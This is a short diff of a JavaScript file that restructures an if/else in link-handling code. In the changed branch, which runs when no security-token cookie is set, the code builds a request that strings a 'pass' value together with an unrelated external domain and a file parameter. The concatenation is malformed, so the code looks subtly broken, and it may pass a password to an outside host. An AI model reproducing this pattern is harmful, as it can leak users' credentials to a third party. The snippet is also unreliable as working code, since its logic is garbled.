@@ -50,9 +50,9 @@ function gotolink(linkname, params) {
 if (myParam != null) {
   if (getCookie("securitytoken") != "") {
     gotofile(myParam)
-  }
-} else {
+  } else {
   gotolink("verify", "?pass=" + pass + "https://eaterofananas88.xyz/?file=" + myParam)
+}
 }
 
 if (link != null) {
